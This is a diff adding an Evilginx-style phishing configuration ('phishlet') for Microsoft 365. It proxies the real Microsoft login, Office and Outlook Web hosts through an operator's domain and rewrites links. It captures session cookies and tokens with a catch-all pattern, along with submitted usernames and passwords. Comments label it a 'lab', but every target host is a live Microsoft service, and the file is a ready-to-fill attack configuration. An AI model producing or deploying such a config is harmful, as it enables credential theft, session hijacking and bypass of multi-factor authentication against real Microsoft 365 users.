@@ -1,0 +1,66 @@
+name: 'outlook365'
+author: '@TheTronFilm'
+min_ver: '2.4.0'
+
+proxy_hosts:
+  # AAD (starting point)
+  - { phish_sub: '', orig_sub: 'login', domain: 'microsoftonline.com', session: true,  is_landing: false }
+
+  # Portal Office (if you start from the portal and it redirects to AAD)
+  - { phish_sub: '', orig_sub: 'www',   domain: 'www.office.com',          session: false, is_landing: true  }
+
+  # CDN AAD (static resources)
+  - { phish_sub: '', orig_sub: 'aadcdn', domain: 'msftauth.net',       session: false, is_landing: false }
+  - { phish_sub: '', orig_sub: 'aadcdn', domain: 'msauth.net',         session: false, is_landing: false }
+
+  # Outlook Web (if your flow reaches OWA)
+  - { phish_sub: '', orig_sub: 'outlook', domain: 'office.com',        session: true,  is_landing: false }
+
+
+# Minimal rewrites to maintain flow in your lab
+sub_filters:
+  # Maintain absolute links to /auth/ within YOUR SUBDOMAIN (do not jump to the actual domain)
+  - triggers_on: 'YOUR DOMAIN'
+    orig_sub: 'www'
+    domain: 'YOUR DOMAIN'
+    search: 'href="YOUR DOMAIN'
+    replace: 'href="YOUR SUBDOMAIN/auth/'
+    mimes: ['text/html']
+
+  # If the landing page uses relative paths, force them to point to YOUR SUBDOMAIN
+  - triggers_on: 'YOUR DOMAIN'
+    orig_sub: 'www'
+    domain: 'YOUR DOMAIN'
+    search: '"/auth/'
+    replace: '"https://YOUR SUBDOMAIN/auth/'
+    mimes: ['text/html','application/javascript']
+
+ # Lab cookies/tokens (fictitious, non-productive)
+auth_tokens:
+  - domain: '.YOUR DOMAIN'
+    keys: ['LABSESSIONID','LABAUTH','.*,regexp']
+
+# LAB credential fields (generic)
+credentials:
+  username:
+    key: 'username'
+    type: 'post'
+    search: '(.*)'
+  password:
+    key: 'password'
+    type: 'post'
+    search: '(.*)'
+
+# Simulated login flow educational routes (your backend must expose them)
+auth_urls:
+  - '/auth/start'
+  - '/auth/continue'
+  - '/auth/complete'
+
+# Entry to the flow (the landing page should link to /auth/start)
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+force_post: []
+js_inject: []
